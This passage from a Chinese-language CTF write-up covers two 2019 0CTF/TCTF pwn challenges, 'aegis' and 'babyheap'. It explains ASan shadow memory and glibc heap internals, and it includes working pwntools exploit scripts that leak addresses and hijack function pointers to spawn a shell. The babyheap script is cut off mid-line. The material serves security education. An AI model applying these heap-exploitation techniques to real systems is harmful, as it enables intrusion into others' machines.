class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>影子内存：<code>asan</code>使用一个字节的数据记录主内存中八字节的数据，因为<code>malloc</code>是按照八字节进行对齐的。这样共分为<code>9</code>种情况<ul><li>8字节的内容可写，则影子内存对应的1字节数据为0</li><li>8字节的内容不可写，则影子内存中对应的1字节数据为负数</li><li>8字节中前n字节可写，剩余地址不可写，则影子内存中对应的1字节数据为k</li></ul></li></ul><p>举例子来说，防御<code>bufferOverflow</code>，则对<code>buffer</code>所在的内存区域的前后两端加一块内存区域，称之为<code>RedZone</code>，并设置<code>RedZone</code>对应的影子内存区域为不可写即可。</p><p><code>asan</code>中主内存与影子内存地址之间的对应采用的是直接内存映射的方式，即<code>shadow_mem_address = (mem_address &gt;&gt; 3) + offset</code>。对于<code>64</code>位来说其<code>offset</code>的值为<code>0x7fff8000</code>，对于<code>32</code>位来说其<code>offset</code>值为<code>0X20000000</code>.</p><p>我们看一下<code>asan</code>内存映射的表现</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2019-0CTF-TCTF-Quals-%E9%83%A8%E5%88%86PWN-WriteUp/20200913191524.png" alt="图片无法显示，请联系作者" title=" "><p>删除堆块之后影子内存变为</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2019-0CTF-TCTF-Quals-%E9%83%A8%E5%88%86PWN-WriteUp/20200914195206.png" alt="图片无法显示，请联系作者" title=" "><p>可以看到影子内存中<code>0xfd</code>表示对应的主内存中的空间为<code>free</code>状态。</p><p>申请的<code>node</code>的<code>0x10</code>大小的<code>chunk</code>地址为<code>0x602000000020</code>，其中<code>buf</code>对应的<code>chunk</code>为<code>0x602000000000</code>。影子内存对应的地址为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">hex</span>((<span class="number">0x602000000000</span> &gt;&gt; <span class="number">3</span>) +  <span class="number">0x7FFF8000</span>) = <span class="number">0xc047fff8000</span></span><br></pre></td></tr></table></figure><p>从其中的数据我们可以看出<code>0x602000000010，0x602000000030</code>对应的十字节的地址是可以写的，其他内存区域都不可写。</p><p>并且从这里我们也可以看到<code>0x20</code>大小的<code>chunk</code>是从<code>0x602000000000</code>内存地址开始分配的。</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p>程序中的结构体如下</p><p>程序一共存在三个漏洞点，第一个是<code>delete</code>函数的时候并没有清空内存指针，造成可以<code>UAF</code>，第二个则是<code> read_until_nl_or_max</code>函数如果输入的字节大小为<code>size</code>的话，则<code>content</code>字符串和<code>id</code>会连接在一起，在<code>update</code>函数的时候<code>strlen</code>就会超出预期的长度，造成堆溢出。但是这两个漏洞由于<code>asan</code>的原因都无法利用。还有一个类似于后门的函数，可以将任意的一个地址改写为<code>0</code>。</p><p>因此我们可以利用这个后门函数将下一个<code>chunk</code>对应的影子内存改写为<code>0</code>，这样就可以通过堆溢出修改下一个<code>chunk</code>的<code>size</code>位。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x10</span>, <span class="string">&quot;1&quot;</span>*<span class="number">0x8</span>, <span class="number">0x123456789abcdef</span>)</span><br><span class="line">secret(<span class="number">0xc047fff8004</span>)</span><br><span class="line">update(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x12</span>, <span class="number">0x123456789</span>) <span class="comment"># overwrite chunkheader, off-by-one chunk size to 0</span></span><br><span class="line">update(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x02ffffff00000002</span>)[:<span class="number">7</span>], <span class="number">0x01f000000002ff</span>)</span><br></pre></td></tr></table></figure><p>首先申请一个<code>0x10</code>大小的<code>chunk</code>，首先申请的是<code>buf</code>位置，<code>0x20</code>大小的<code>chunk</code>，然后是<code>node</code>堆块，内存映射如上图相同。当我们输入的<code>content</code>的长度为<code>size-0x8</code>的时候，<code> read_until_nl_or_max</code>函数的返回值是<code>size-0x8-0x1</code>，后续输入的<code>id</code>会从此位置开始赋值，此时<code>content,id</code>两个域连接在了一起。如果我们输入的<code>id</code>的长度为<code>0xf\0x10</code>大小，就会与下一个<code>chunk</code>的<code>ChunkHeader</code>连接在一起。这里<code>id</code>的高<code>1</code>字节地址的位置为<code>0xbe</code>，此时如果<code>update</code>，程序调用的<code>strlen</code>长度会返回<code>0x11</code>大小，注意到此时会<code>+1</code>，如果我们提前利用<code>secret</code>函数将<code>node</code>堆块的内存映射更改为<code>0</code>的话，此时我们就可以覆写下一个<code>chunk</code>的<code>ChunkerHeader</code>。同理再次利用<code>content,id</code>字符串的连接，我们可以将堆溢出到<code>ChunkerHeader</code>的<code>user_requested_size</code>位置。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2019-0CTF-TCTF-Quals-%E9%83%A8%E5%88%86PWN-WriteUp/20200914194534.png" alt="图片无法显示，请联系作者" title=" "><p><code>ChunkHeader</code>的<code>2-nd 8 Bytes</code>的低<code>29</code>字节表示的是<code>user_requested_size</code>位置，也就是<code>size</code>从<code>0x10</code>大小被改为了<code>0x10000000</code>大小。当这个较大的<code>chunk</code>被释放掉之后，影子内存会被重新置为<code>0xfa</code></p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2019-0CTF-TCTF-Quals-%E9%83%A8%E5%88%86PWN-WriteUp/20200914204256.png" alt="图片无法显示，请联系作者" title=" "><p>此时如果再次申请一个<code>node1</code>，由于<code>UAF</code>的存在，我们可以通过<code>buf</code>控制<code>node</code>结构体。控制结构体就控制了<code>buf</code>指针，就可以利用<code>0,1 node</code>进行地址泄露和任意的地址写。</p><p><code>getshell</code>的选择有两个一个是，覆写<code>bbs</code>的<code>_ZN11__sanitizerL15UserDieCallbackE</code>函数指针。如果在<code>update</code>的时候如果<code>cfi</code>函数的地址与<code>cfi_check</code>函数的地址不一样则会发生如下的函数调用链</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2019-0CTF-TCTF-Quals-%E9%83%A8%E5%88%86PWN-WriteUp/20200915115007.png" alt="图片无法显示，请联系作者" title=" "><p>如果我们将<code>node1</code>的<code>buf</code>改为<code>_ZN11__sanitizerL15UserDieCallbackE</code>函数的地址，注意到此时<code>id</code>的位置即为<code>node0 cfi_address</code>的位置，就可以利用<code>node0</code>对函数指针进行修改，将其修改为<code>one_gadget</code>地址，就可以<code>getshell</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./aegis&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *$rebase(0x114A25)&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x10a45c</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content=<span class="string">&quot;1\n&quot;</span>, <span class="built_in">id</span>=<span class="number">1</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;ID: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index, content, <span class="built_in">id</span></span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;New Content: &quot;</span>, content)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;New ID: &quot;</span>, <span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shut</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">secret</span>(<span class="params">address</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Choice: &quot;</span>, <span class="built_in">str</span>(<span class="number">666</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Lucky Number: &quot;</span>, <span class="built_in">str</span>(address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&quot;1&quot;</span> * <span class="number">0x8</span>, <span class="number">0x123456789abcdef</span>)</span><br><span class="line">secret(<span class="number">0xc047fff8004</span>)</span><br><span class="line">update(<span class="number">0</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x12</span>, <span class="number">0x123456789</span>)  <span class="comment"># overwrite chunkheader, off-by-one chunk size to 0</span></span><br><span class="line">update(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0x02ffffff00000002</span>)[:<span class="number">7</span>], <span class="number">0x01f000000002ff</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x10</span>, p64(<span class="number">0x602000000018</span>), <span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">elf.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x114AB0</span></span><br><span class="line">log.success(<span class="string">&quot;elf address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(elf.address)))</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">update(<span class="number">1</span>, p64(puts_got)[:<span class="number">2</span>], puts_got &gt;&gt; <span class="number">8</span>) <span class="comment"># strlen = 1</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">_ZN11__sanitizerL15UserDieCallbackE_address = elf.address + <span class="number">0xFB0888</span></span><br><span class="line">update(<span class="number">1</span>, p64(_ZN11__sanitizerL15UserDieCallbackE_address)[:<span class="number">7</span>], <span class="number">0</span>)</span><br><span class="line">one_gadget += libc.address</span><br><span class="line">update(<span class="number">0</span>, p64(one_gadget)[:<span class="number">1</span>], one_gadget)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>是一个<code>2.28</code>下面的题目。程序提供了四种功能<code>add,edit,delete,show</code>。程序首先<code>mmap</code>了一段内存，然后申请了一块很大的内存空间之后才开始进行菜单操作。<code>add</code>函数中限制了申请的最大的堆块的大小为<code>0X58</code>，并且采用<code>calloc</code>分配，不经过<code>tcache</code>。<code>buf_list</code>存储在之前<code>mmap</code>的空间内。</p><p>漏洞出现在<code>update</code>函数中，存在一个<code>off-by-null</code>漏洞。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/2019-0CTF-TCTF-Quals-%E9%83%A8%E5%88%86PWN-WriteUp/20200917173532.png" alt="图片无法显示，请联系作者" title=" "><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>泄露<code>libc</code>基址的需要一个<code>unsorted bin</code>，但是限制的最大的<code>chunk</code>为<code>fastbin</code>，<code>fastbin</code>转换为<code>unsortedbin</code>可以通过<code>malloc_consolidate</code>函数将<code>fastbin</code>放入<code>small bin</code>中，此时就存在一个<code>main_arena</code>附近的地址。</p><p>可以通过利用的堆的高一字节地址<code>0x56</code>将<code>chunk</code>分配到<code>main_arena</code>的位置，覆写<code>top chunk</code>到<code>free_hook</code>的位置，将<code>free_hook</code>覆写为<code>one_gadget</code></p><ul><li><p>想要调用<code>malloc_consolidate</code>函数需要的就是<code>top chunk</code>的大小不满足用户申请的大小，在程序一开始申请了一个较大的<code>chunk</code>之后，<code>top chunk</code>的大小是<code>0x1da0</code>。需要注意的是在消耗<code>top chunk</code>的时候需要提前申请连续的<code>fastbin</code>堆块，以方便后面的<code>fastbin</code>合并。</p></li><li><p>在堆块合并得到<code>unsorted bin</code>之后，利用<code>off-by-one</code>覆写其<code>size</code>区域，使<code>unsorted bin shrink</code>到之前布局好的<code>pre_size,size</code>位置，之后再利用<code>consolidate</code>合并堆块。连续申请几个堆块就可以得到指向相同堆块的两个指针。</p></li><li><p>利用<code>fastbin attack</code>分配<code>chunk</code>到<code>main_arena</code>位置，利用<code>chunk</code>的<code>0x56</code>高一字节地址作为<code>size</code>，覆写<code>top chunk</code>指向<code>heap</code>起始位置。<code>heap</code>起始存储的是<code>tcache_perthread_struct</code>结构体，也就是<code>tcache_entry</code>结构体中<code>key</code>指向的位置。通过覆写此结构体可以更改<code>tcache</code>中存储的堆块的数量。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure></li><li><p>连续分配几个<code>chunk</code>得到指向<code>heap</code>起始位置，覆写所有的<code>counts</code>为零。覆写<code>top chunk</code>指向<code>stdin</code>的位置。然后连续分配<code>chunk</code>消耗<code>top chunk</code>，最终将堆块分配到<code>free_hook</code>的位置。在不断申请<code>chunk</code>的过程中，在<code>tcache</code>满的时候需要清空一下<code>tcache</code>的<code>count</code>，防止释放堆块的时候进入<code>fastbin</code>，影响后面的堆块申请。</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./babyheap&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;b *$rebase(0x18a7)&quot;)</span></span><br><span class="line">    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x103f50</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Size: &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Command: &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding</span>(<span class="params">size</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        add(size)</span><br><span class="line">        edit(i, size, <span class="string">&quot;a&quot;</span> * size)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">padding2</span>(<span class="params">size, index_array</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        add(size)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> index_array:</span><br><span class="line">        delete(i)</span><br><span class="line">    edit(<span class="number">12</span>, <span class="number">0x28</span>, <span class="string">b&quot;\x00&quot;</span> * <span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x555555578260 (size : 0x1da0)</span></span><br><span class="line">padding(<span class="number">0x28</span>)  <span class="comment"># cost 0x700</span></span><br><span class="line">padding(<span class="number">0x38</span>)  <span class="comment"># remain 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x48</span>)</span><br><span class="line">    edit(i, <span class="number">0x48</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x48</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># remain 0x800</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):  <span class="comment"># fastbin</span></span><br><span class="line">    add(<span class="number">0x38</span>)</span><br><span class="line">    edit(i, <span class="number">0x38</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line"><span class="comment"># make fake chunk</span></span><br><span class="line">edit(<span class="number">4</span>, <span class="number">0x38</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x100</span>) + p64(<span class="number">0x60</span>) + p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># remain 0x300</span></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">edit(<span class="number">5</span>, <span class="number">0x48</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">edit(<span class="number">6</span>, <span class="number">0x38</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x38</span>)</span><br><span class="line"><span class="comment"># reamin 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line">add(<span class="number">0x58</span>)</span><br><span class="line"><span class="comment"># reamin 0x40</span></span><br><span class="line"><span class="comment"># malloc_consolidate, get 0x40*5 - 0x30 = 0x110 unsorted bin</span></span><br><span class="line">add(<span class="number">0x28</span>)</span><br><span class="line"><span class="comment"># off-by-one, 0x110-&gt;0x100</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="number">0x28</span>, <span class="string">&quot;a&quot;</span> * <span class="number">0x28</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x38</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>)</span><br><span class="line">add(<span class="number">0x38</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x38</span>)  <span class="comment"># 8</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># malloc_consolidate fastbin,get 0x50+0x110-0x30=0x130 unsorted bin</span></span><br><span class="line">add(<span class="number">0x28</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x48</span>)  <span class="comment"># 4</span></span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Chunk[5]: &quot;</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">8</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">top_chunk_address = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span> + <span class="number">96</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)  <span class="comment"># 9 = 5, overlap 8</span></span><br><span class="line">delete(<span 